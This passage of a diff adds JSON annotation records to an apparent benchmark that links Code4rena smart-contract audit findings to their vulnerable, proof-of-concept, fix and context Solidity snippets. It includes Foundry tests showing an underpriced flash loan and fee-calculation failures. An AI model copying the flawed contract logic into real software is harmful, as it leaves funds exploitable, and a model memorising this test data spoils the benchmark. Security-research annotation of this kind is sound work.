+        "role_basis": "of\n    );\n```\n\nThe pool subtracts the fee, and sends the rest back to the router. After the first iteration the router contains less ETH than `msg.value` and will revert\n\nAdd to `Change.t.sol` and run with `forge test --match test_twoChanges -vvvv`\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 1941,
+          "end_offset": 3887
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 3,
+        "language_label": "solidity",
+        "snippet": "PrivatePool(_change.pool).change{value: _change.baseTokenAmount}(\n  // -- snip --\n);\n",
+        "snippet_sha256": "5066a0a4e92cc40c3e677ac67a32f74666013e2a81fdf503394877cd2a96dc82",
+        "role": "fix",
+        "role_basis": "outdoteth/caviar-private-pools/pull/5](https://github.com/outdoteth/caviar-private-pools/pull/5)\n\nThe proposed fix is to add a `baseTokenAmount` field in the Change struct and to use this field instead of msg.value when making the change operation.\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 4639,
+          "end_offset": 4724
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "snippet",
+        "snippet_sha256": "3589a3d7153da1fd146e5f09e9341e637e85ed07aa25d8055b4efe5e810348f8",
+        "reason": "Console/transaction output is not Solidity source."
+      },
+      {
+        "type": "url",
+        "url": "https://github.com/code-423n4/2023-04-caviar-findings/issues/873",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "c4-2023-04-caviar-m-03-flash-loan-fee-is-incorrect-in-private-pool-contract",
+    "input_sha256": "8077154ccdd2c9f441d06c724ac823fc22ef46bf677999a1ec76146954e59e69",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "Gist is described as the complete test file; PoC role is report-derived.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L750-L752",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_file",
+        "start_line": 750,
+        "end_line": 752,
+        "repo": "code-423n4/2023-04-caviar",
+        "ref": "main",
+        "path": "src/PrivatePool.sol",
+        "report_location": {
+          "field": "content",
+          "start_offset": 2592,
+          "end_offset": 2676
+        }
+      },
+      {
+        "type": "url",
+        "url": "https://github.com/outdoteth/caviar-private-pools/pull/6",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_diff",
+        "role_basis": "Report links a change; before/after contents have not been validated.",
+        "report_location": {
+          "field": "content",
+          "start_offset": 5094,
+          "end_offset": 5150
+        }
+      },
+      {
+        "type": "url",
+        "url": "https://gist.github.com/romeroadrian/06238839330315780b90d9202042ea0f",
+        "role": "poc",
+        "resolution_expectation": "not_fetched",
+        "kind": "gist",
+        "role_basis": "Report describes this Gist as the complete test file.",
+        "report_location": {
+          "field": "content",
+          "start_offset": 3608,
+          "end_offset": 3677
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 0,
+        "language_label": "solidity",
+        "snippet": "750:     function flashFee(address, uint256) public view returns (uint256) {\n751:         return changeFee;\n752:     }\n",
+        "snippet_sha256": "f627ae6c8b49253087518ce22e5117a9ccf47a046c9cbb439d2f1a782b5ca29a",
+        "role": "vulnerable",
+        "role_basis": "just returns the value of `changeFee` without any scaling or modification.\n\n[https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L750-L752](https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L750-L752)\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 2777,
+          "end_offset": 2896
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 1,
+        "language_label": "solidity",
+        "snippet": "function test_PrivatePool_flashLoan_IncorrectFee() public {\n    // Setup pool\n    PrivatePool privatePool = new PrivatePool(\n        address(factory),\n        address(royaltyRegistry),\n        address(stolenNftOracle)\n    );\n    uint56 changeFee = 25;\n    privatePool.initialize(\n        address(0), // address _baseToken,\n        address(milady), // address _nft,\n        100e18, // uint128 _virtualBaseTokenReserves,\n        10e18, // uint128 _virtualNftReserves,\n        changeFee, // uint56 _changeFee,\n        0, // uint16 _feeRate,\n        bytes32(0), // bytes32 _merkleRoot,\n        false, // bool _useStolenNftOracle,\n        false // bool _payRoyalties\n    );\n    \n    uint256 tokenId = 0;\n    milady.mint(address(privatePool), tokenId);\n    \n    // Alice executes a flash loan\n    vm.startPrank(alice);\n    \n    FlashLoanBorrower flashLoanBorrower = new FlashLoanBorrower();\n    \n    // Alice just sends 25 wei!\n    vm.deal(alice, changeFee);\n    privatePool.flashLoan{value: changeFee}(flashLoanBorrower, address(milady), tokenId, \"\");\n    \n    vm.stopPrank();\n}\n",
+        "snippet_sha256": "a8cb391489affb2a580b8f5ddcd46f5057a60c0fe726181bd8260bd566e222e1",
+        "role": "poc",
+        "role_basis": "` value of 25, and Alice is able to execute a flash loan by just paying 25 wei.\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/06238839330315780b90d9202042ea0f).\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 3693,
+          "end_offset": 4767
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 2,
+        "language_label": "solidity",
+        "snippet": "function flashFee(address, uint256) public view returns (uint256) {\n    // multiply the changeFee to get the fee per NFT (4 decimals of accuracy)\n    uint256 exponent = baseToken == address(0) ? 18 - 4 : ERC20(baseToken).decimals() - 4;\n    uint256 feePerNft = changeFee * 10 ** exponent;\n    return feePerNft;\n}\n",
+        "snippet_sha256": "671aafc71b46ed01249f812e57b5bac83aa5467228ce4eece9cee29188afa0d8",
+        "role": "fix",
+        "role_basis": "ps://github.com/outdoteth/caviar-private-pools/pull/6](https://github.com/outdoteth/caviar-private-pools/pull/6)\n\nProposed fix is to exponentiate the changeFee to get the correct flashFee in the same way that changeFee is exponentiated in change().\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 5359,
+          "end_offset": 5672
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "url",
+        "url": "https://github.com/code-423n4/2023-04-caviar-findings/issues/864",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "c4-2023-04-caviar-m-04-changefeequote-will-fail-for-low-decimal-erc20-tokens",
+    "input_sha256": "14a29c234ef4ffc645010f40dbbd6518c364ea8dee1b24b4bf83f79a0928bda7",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "Selected candidates and roles reviewed against report text; remote code not independently verified.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L87-L88",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_file",
+        "start_line": 87,
+        "end_line": 88,
+        "repo": "code-423n4/2023-04-caviar",
+        "ref": "main",
+        "path": "src/PrivatePool.sol",
+        "report_location": {
+          "field": "content",
+          "start_offset": 2310,
+          "end_offset": 2392
+        }
+      },
+      {
+        "type": "url",
+        "url": "https://gist.github.com/romeroadrian/06238839330315780b90d9202042ea0f",
+        "role": "poc",
+        "resolution_expectation": "not_fetched",
+        "kind": "gist",
+        "role_basis": "Report describes this Gist as the complete test file.",
+        "report_location": {
+          "field": "content",
+          "start_offset": 4671,
+          "end_offset": 4740
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 0,
+        "language_label": "solidity",
+        "snippet": "87:     /// @notice The change/flash fee to 4 decimals of precision. For example, 0.0025 ETH = 25. 500 USDC = 5_000_000.\n88:     uint56 public changeFee;\n",
+        "snippet_sha256": "668b5432b4e7cc2584c8a7f091a4c03e27fbcdce6e10bd8df17b747c1b6e7c76",
+        "role": "context",
+        "role_basis": "eFee` variable, which is intended to be defined using 4 decimals of precision:\n\n[https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L87-L88](https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L87-L88)\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 2491,
+          "end_offset": 2645
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 1,
+        "language_label": "solidity",
+        "snippet": "731:     function changeFeeQuote(uint256 inputAmount) public view returns (uint256 feeAmount, uint256 protocolFeeAmount) {\n732:         // multiply the changeFee to get the fee per NFT (4 decimals of accuracy)\n733:         uint256 exponent = baseToken == address(0) ? 18 - 4 : ERC20(baseToken).decimals() - 4;\n734:         uint256 feePerNft = changeFee * 10 ** exponent;\n735: \n736:         feeAmount = inputAmount * feePerNft / 1e18;\n737:         protocolFeeAmount = feeAmount * Factory(factory).protocolFeeRate() / 10_000;\n738:     }\n",
+        "snippet_sha256": "d471084560cf390b8568eadcc9b0521ccf476cc3344cdd4e12327242c7994077",
+        "role": "vulnerable",
+        "role_basis": "the token. The implementation is defined in the `changeFeeQuote` function.\n\n[https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L731-L738](https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L731-L738)\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 3088,
+          "end_offset": 3623
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 2,
+        "language_label": "solidity",
+        "snippet": "function test_PrivatePool_changeFeeQuote_LowDecimalToken() public {\n    // Create a pool with GUSD which has 2 decimals\n    ERC20 gusd = new GUSD();\n\n    PrivatePool privatePool = new PrivatePool(\n        address(factory),\n        address(royaltyRegistry),\n        address(stolenNftOracle)\n    );\n    privatePool.initialize(\n        address(gusd), // address _baseToken,\n        address(milady), // address _nft,\n        100e18, // uint128 _virtualBaseTokenReserves,\n        10e18, // uint128 _virtualNftReserves,\n        500, // uint56 _changeFee,\n        100, // uint16 _feeRate,\n        bytes32(0), // bytes32 _merkleRoot,\n        false, // bool _useStolenNftOracle,\n        false // bool _payRoyalties\n    );\n\n    // The following will fail due an overflow. Calls to `change` function will always revert.\n    vm.expectRevert();\n    privatePool.changeFeeQuote(1e18);\n}\n",
+        "snippet_sha256": "82986b404e36704a31b13c962aafbdf794a4758f7efddf83ca0101793f00bbfb",
+        "role": "poc",
+        "role_basis": "all to `change` or `changeFeeQuote` will be reverted due to an underflow error.\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/06238839330315780b90d9202042ea0f).\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 4756,
+          "end_offset": 5628
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "url",
+        "url": "https://github.com/code-423n4/2023-04-caviar-findings/issues/858",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "c4-2023-05-juicebox-m-01-delegate-architecture-forces-users-to-set-zero-slippage",
+    "input_sha256": "240c119a8b2daa921821588a4b764d17d413a4a1be0e800130ec354a19516483",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "Selected candidates and roles reviewed against report text; remote code not independently verified.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/code-423n4/2023-05-juicebox/blob/main/juice-buyback/contracts/JBXBuybackDelegate.sol#L144-L171",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_file",
+        "start_line": 144,
+        "end_line": 171,
+        "repo": "code-423n4/2023-05-juicebox",
+        "ref": "main",
+        "path": "juice-buyback/contracts/JBXBuybackDelegate.sol",
+        "report_location": {
+          "field": "content",
+          "start_offset": 961,
+          "end_offset": 1074
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 0,
+        "language_label": "solidity",
+        "snippet": "144:     function payParams(JBPayParamsData calldata _data)\n145:         external\n146:         override\n147:         returns (uint256 weight, string memory memo, JBPayDelegateAllocation[] memory delegateAllocations)\n148:     {\n149:         // Find the total number of tokens to mint, as a fixed point number with 18 decimals\n150:         uint256 _tokenCount = PRBMath.mulDiv(_data.amount.value, _data.weight, 10 ** 18);\n151: \n152:         // Unpack the quote from the pool, given by the frontend\n153:         (,, uint256 _quote, uint256 _slippage) = abi.decode(_data.metadata, (bytes32, bytes32, uint256, uint256));\n154: \n155:         // If the amount swapped is bigger than the lowest received when minting, use the swap pathway\n156:         if (_tokenCount < _quote - (_quote * _slippage / SLIPPAGE_DENOMINATOR)) {\n157:             // Pass the quote and reserve rate via a mutex\n158:             mintedAmount = _tokenCount;\n159:             reservedRate = _data.reservedRate;\n160: \n161:             // Return this delegate as the one to use, and do not mint from the terminal\n162:             delegateAllocations = new JBPayDelegateAllocation[](1);\n163:             delegateAllocations[0] =\n164:                 JBPayDelegateAllocation({delegate: IJBPayDelegate(this), amount: _data.amount.value});\n165: \n166:             return (0, _data.memo, delegateAllocations);\n167:         }\n168: \n169:         // If minting, do not use this as delegate\n170:         return (_data.weight, _data.memo, new JBPayDelegateAllocation[](0));\n171:     }\n",
+        "snippet_sha256": "1d4345190d881e8ef4d2753f181e3f4bea7740d3065ed86b99e1cd75d8af1f48",
+        "role": "vulnerable",
+        "role_basis": "ariable to zero:\n\n[https://github.com/code-423n4/2023-05-juicebox/blob/main/juice-buyback/contracts/JBXBuybackDelegate.sol#L144-L171](https://github.com/code-423n4/2023-05-juicebox/blob/main/juice-buyback/contracts/JBXBuybackDelegate.sol#L144-L171)\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 1204,
+          "end_offset": 2743
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 1,
+        "language_label": "solidity",
+        "snippet": "...\ntokenCount = PRBMath.mulDiv(_amount.value, _weight, _weightRatio);\n...\n",
+        "snippet_sha256": "60a2b83df4a3874a9635c396e0ab57802d4d2ad55484cc57529ac50972d70c51",
+        "role": "context",
+        "role_basis": " contract:\n\n[https://github.com/jbx-protocol/juice-contracts-v3/blob/main/contracts/JBSingleTokenPaymentTerminalStore3_1.sol#L427](https://github.com/jbx-protocol/juice-contracts-v3/blob/main/contracts/JBSingleTokenPaymentTerminalStore3_1.sol#L427)\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 3259,
+          "end_offset": 3334
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 2,
+        "language_label": "solidity",
+        "snippet": "...\n\n(_fundingCycle, _tokenCount, _delegateAllocations, _memo) = store.recordPaymentFrom(\n  _payer,\n  _bundledAmount,\n  _projectId,\n  baseWeightCurrency,\n  _beneficiary,\n  _memo,\n  _metadata\n);\n\n// Mint the tokens if needed.\nif (_tokenCount > 0)\n  // Set token count to be the number of tokens minted for the beneficiary instead of the total amount.\n  beneficiaryTokenCount = IJBController(directory.controllerOf(_projectId)).mintTokensOf(\n    _projectId,\n    _tokenCount,\n    _beneficiary,\n    '',\n    _preferClaimedTokens,\n    true\n  );\n\n// The token count for the beneficiary must be greater than or equal to the minimum expected.\nif (beneficiaryTokenCount < _minReturnedTokens) revert INADEQUATE_TOKEN_COUNT();\n\n...\n",
+        "snippet_sha256": "9e7e7222bd90575fbd50a8a6055edfc03df8275a1c3da2bf1baa5c6353063e56",
+        "role": "context",
+        "role_basis": "jbx-protocol/juice-contracts-v3/blob/main/contracts/abstract/JBPayoutRedemptionPaymentTerminal3_1.sol#L1470-L1493](https://github.com/jbx-protocol/juice-contracts-v3/blob/main/contracts/abstract/JBPayoutRedemptionPaymentTerminal3_1.sol#L1470-L1493)\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 3854,
+          "end_offset": 4574
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "url",
+        "url": "https://github.com/code-423n4/2023-05-juicebox-findings/issues/232",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "c4-2023-05-juicebox-m-02-low-liquidity-in-uniswap-v3-pool-can-lead-to-eth-lockup-in-jbxbuybackdelegate-contract",
+    "input_sha256": "018a65595ea29913e3d4f3f53eef62abafc912596cdfcd85276155630c25f868",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "GitHub column-qualified anchor LL640C9-L650C15 must retain lines 640-650.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/Uniswap/v3-core/blob/main/contracts/UniswapV3Pool.sol#LL640C9-L650C15",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_file",
+        "start_line": 640,
+        "end_line": 650,
+        "repo": "Uniswap/v3-core",
+        "ref": "main",
+        "path": "contracts/UniswapV3Pool.sol",
+        "report_location": {
+          "field": "content",
+          "start_offset": 2597,
+          "end_offset": 2685
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 0,
+        "language_label": "solidity",
+        "snippet": "try pool.swap({\n    recipient: address(this),\n    zeroForOne: !_projectTokenIsZero,\n    amountSpecified: int256(_data.amount.value),\n    sqrtPriceLimitX96: _projectTokenIsZero ? TickMath.MAX_SQRT_RATIO - 1 : TickMath.MIN_SQRT_RATIO + 1,\n    data: abi.encode(_minimumReceivedFromSwap)\n}) returns (int256 amount0, int256 amount1) {\n    // Swap succeeded, take note of the amount of projectToken received (negative as it is an exact input)\n    _amountReceived = uint256(-(_projectTokenIsZero ? amount0 : amount1));\n} catch {\n    // implies _amountReceived = 0 -> will later mint when back in didPay\n    return _amountReceived;\n}\n",
+        "snippet_sha256": "0ae53144c7a04d2bbb33f02f5aeaf7343b949804a44c81535f8f7dd309990a99",
+        "role": "vulnerable",
+        "role_basis": "in the contract.\n\n### Proof of Concept\n\nThe `_swap()` function interacts with the Uniswap V3 pool. It sets `sqrtPriceLimitX96` to the minimum or maximum feasible value to ensure that the swap attempts to utilize all available liquidity in the pool.\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 1929,
+          "end_offset": 2555
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 1,
+        "language_label": "solidity",
+        "snippet": "// continue swapping as long as we haven't used the entire input/output and haven't reached the price limit\nwhile (state.amountSpecifiedRemaining != 0 && state.sqrtPriceX96 != sqrtPriceLimitX96) {\n    StepComputations memory step;\n\n    step.sqrtPriceStartX96 = state.sqrtPriceX96;\n\n    (step.tickNext, step.initialized) = tickBitmap.nextInitializedTickWithinOneWord(\n        state.tick,\n        tickSpacing,\n        zeroForOne\n    );\n",
+        "snippet_sha256": "751896fec0295938f4c19816df310ccc5990a29c449b430303da46ddee2338d7",
+        "role": "context",
+        "role_basis": "in/contracts/UniswapV3Pool.sol#LL640C9-L650C15) stops the loop if the price limit is reached or the entire input has been used. If the pool does not have enough liquidity, it will still do the swap until the price reaches the minimum/maximum price.\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 2901,
+          "end_offset": 3335
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 2,
+        "language_label": "solidity",
+        "snippet": "function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external override {\n    // Check if this is really a callback\n    if (msg.sender != address(pool)) revert JuiceBuyback_Unauthorized();\n\n    // Unpack the data\n    (uint256 _minimumAmountReceived) = abi.decode(data, (uint256));\n\n    // Assign 0 and 1 accordingly\n    uint256 _amountReceived = uint256(-(_projectTokenIsZero ? amount0Delta : amount1Delta));\n    uint256 _amountToSend = uint256(_projectTokenIsZero ? amount1Delta : amount0Delta);\n\n    // Revert if slippage is too high\n    if (_amountReceived < _minimumAmountReceived) revert JuiceBuyback_MaximumSlippage();\n\n    // Wrap and transfer the weth to the pool\n    weth.deposit{value: _amountToSend}();\n    weth.transfer(address(pool), _amountToSend);\n}\n",
+        "snippet_sha256": "9e754a39cf1b0b01481e31ecbb77da00d2b9bcee0c89446f63ef45dd16f12574",
+        "role": "vulnerable",
+        "role_basis": "ckSpacing,\n        zeroForOne\n    );\n```\n\nFinally, the `uniswapV3SwapCallback()` function uses the input from the pool callback to wrap ETH and transfer WETH to the pool. So, if `_amountToSend < msg.value`, the unused ETH is locked in the contract.\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 3560,
+          "end_offset": 4365
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "url",
+        "url": "https://github.com/code-423n4/2023-05-juicebox-findings/issues/162",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "c4-2023-05-juicebox-m-03-funding-cycles-that-use-jbxbuybackdelegate-as-a-redeem-data-source-or-any-derived-class-will-slash-all-redeemable-tokens",
+    "input_sha256": "203bf376032b36869fce00be633a992f6f9404f1040d93bdaf073e2bf1de5887",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "Selected candidates and roles reviewed against report text; remote code not independently verified.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/code-423n4/2023-05-juicebox/blob/main/juice-buyback/contracts/JBXBuybackDelegate.sol#L235-L239",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_file",
+        "start_line": 235,
+        "end_line": 239,
+        "repo": "code-423n4/2023-05-juicebox",
+        "ref": "main",
+        "path": "juice-buyback/contracts/JBXBuybackDelegate.sol",
+        "report_location": {
+          "field": "content",
+          "start_offset": 2510,
+          "end_offset": 2623
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 0,
+        "language_label": "solidity",
+        "snippet": "  // This is unused but needs to be included to fulfill IJBFundingCycleDataSource.\n  function redeemParams(JBRedeemParamsData calldata _data)\n    external\n    pure\n    override\n    returns (\n      uint256 reclaimAmount,\n      string memory memo,\n      IJBRedemptionDelegate delegate\n    )\n  {\n    // Return the default values.\n    return (_data.reclaimAmount.value, _data.memo, IJBRedemptionDelegate(address(0)));\n  }\n",
+        "snippet_sha256": "ee33351ee9feb703e1655c92b84e2e019594ef6cd42a17b02c55d93e03580e93",
+        "role": "fix",
+        "role_basis": "mParamsData.reclaimAmount value if no altered functionality is desired.\nReturn the JBRedeemParamsData.memo value if no altered functionality is desired.\nReturn the zero address if no additional functionality is desired.\n\nWhat should have been done:\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 2064,
+          "end_offset": 2482
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 1,
+        "language_label": "solidity",
+        "snippet": "    function redeemParams(JBRedeemParamsData calldata _data)\n        external\n        override\n        returns (uint256 reclaimAmount, string memory memo, JBRedemptionDelegateAllocation[] memory delegateAllocations)\n    {}\n",
+        "snippet_sha256": "c4edaef9c0e2b18d2983b6b9940b947af7ed2159fddcf9b4bba256f528c789c3",
+        "role": "vulnerable",
+        "role_basis": " is implemented:\n\n[https://github.com/code-423n4/2023-05-juicebox/blob/main/juice-buyback/contracts/JBXBuybackDelegate.sol#L235-L239](https://github.com/code-423n4/2023-05-juicebox/blob/main/juice-buyback/contracts/JBXBuybackDelegate.sol#L235-L239)\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 2753,
+          "end_offset": 2976
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 2,
+        "language_label": "solidity",
+        "snippet": "  // This is unused but needs to be included to fulfill IJBFundingCycleDataSource.\n  function redeemParams(JBRedeemParamsData calldata _data)\n    external\n    pure\n    override\n    virtual\n    returns (\n      uint256 reclaimAmount,\n      string memory memo,\n      IJBRedemptionDelegate delegate\n    )\n  {\n    // Return the default values.\n    return (_data.reclaimAmount.value, _data.memo, IJBRedemptionDelegate(address(0)));\n  }\n",
+        "snippet_sha256": "489a467d05f3fc6048ff9afc329692c8808829b588eb413d225317c6771c3a17",
+        "role": "fix",
+        "role_basis": ", as such, no inheriting class can modify the faulty implementation if any such extension is desired.\n\n### Recommended Mitigation Steps\n\nChange the implementation of the function to respect protocol logic and add the `virtual` keyword, for example:\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 4144,
+          "end_offset": 4574
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "url",
+        "url": "https://github.com/code-423n4/2023-05-juicebox-findings/issues/79",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "c4-2023-01-astaria-h-01-lientoken-lender-and-liquidator-can-collude-to-block-auction-and-seize-collateral",
+    "input_sha256": "232ed76173132af08024b7f879d00b032d53058eadf3cf3379871a4abfffa8b8",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "Selected candidates and roles reviewed against report text; remote code not independently verified.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L849",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_file",
+        "start_line": 849,
+        "end_line": 849,
+        "repo": "code-423n4/2023-01-astaria",
+        "ref": "1bfc58b42109b839528ab1c21dc9803d663df898",
+        "path": "src/LienToken.sol",
+        "report_location": {
+          "field": "content",
+          "start_offset": 272,
+          "end_offset": 386
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 0,
+        "language_label": "solidity",
+        "snippet": "  function _getPayee(LienStorage storage s, uint256 lienId)\n    internal\n    view\n    returns (address)\n  {\n    return\n      s.lienMeta[lienId].payee != address(0)\n        ? s.lienMeta[lienId].payee\n        : ownerOf(lienId);\n  }\n",
+        "snippet_sha256": "92f0ab0e54f46e02e7ed231f72eabaf7a1654b23c7986a5d42aca81f5bacf365",
+        "role": "context",
+        "role_basis": "r transfers their lien token to another address, the lien’s new payee will be the `ownerOf` the token:\n\n``[LienToken#_getPayee](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L900-L909)\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 1430,
+          "end_offset": 1660
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 1,
+        "language_label": "solidity",
+        "snippet": "    s.TRANSFER_PROXY.tokenTransferFrom(stack.lien.token, payer, payee, amount);\n",
+        "snippet_sha256": "aa56082140b8f744091695303214f144b6620573f06486eacf0b3bf8c492ec78",
+        "role": "vulnerable",
+        "role_basis": "payee address returned by `_getPayee` is used as the recipient address of loan repayments via `makePayment`:\n\n``[LienToken#_payment](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L849)\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 1931,
+          "end_offset": 2011
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 2,
+        "language_label": "solidity",
+        "snippet": "    if (payment > 0)\n      s.TRANSFER_PROXY.tokenTransferFrom(token, payer, payee, payment);\n",
+        "snippet_sha256": "bfadc273ff0ecb2cf9e3b107686462164c62acae07048b83fcbc7763c51bff00",
+        "role": "vulnerable",
+        "role_basis": "nt);\n```\n\n…as well as post-liquidation payments from the clearinghouse via `payDebtViaClearingHouse`:\n\n``[LienToken#_paymentAH](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L642-L643)\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 2268,
+          "end_offset": 2361
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 3,
+        "language_label": "solidity",
+        "snippet": "  function settleLiquidatorNFTClaim() external {\n    IAstariaRouter ASTARIA_ROUTER = IAstariaRouter(_getArgAddress(0));\n\n    require(msg.sender == address(ASTARIA_ROUTER.COLLATERAL_TOKEN()));\n    ClearingHouseStorage storage s = _getStorage();\n    ASTARIA_ROUTER.LIEN_TOKEN().payDebtViaClearingHouse(\n      address(0),\n      COLLATERAL_ID(),\n      0,\n      s.auctionStack.stack\n    );\n  }\n",
+        "snippet_sha256": "632c40e4648b99fc23ff0d1f83c529bb49d64cfdf5110f8ab09ef89706f79fb0",
+        "role": "context",
+        "role_basis": "the loan for zero payment, claiming the “liquidated” collateral token for free:\n\n``[ClearingHouse#settleLiquidatorNFTClaim](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L220-L231)\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 3151,
+          "end_offset": 3540
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "url",
+        "url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/607",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "c4-2023-01-astaria-h-02-erc4626cloned-deposit-and-mint-logic-differ-on-first-deposit",
+    "input_sha256": "696bab5fa6f967181551166942b5873026a4a1ab459f66ebf8c98d8677cfded3",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "Selected candidates and roles reviewed against report text; remote code not independently verified.",
+    "expected": [
+      {
+        "type": "url",
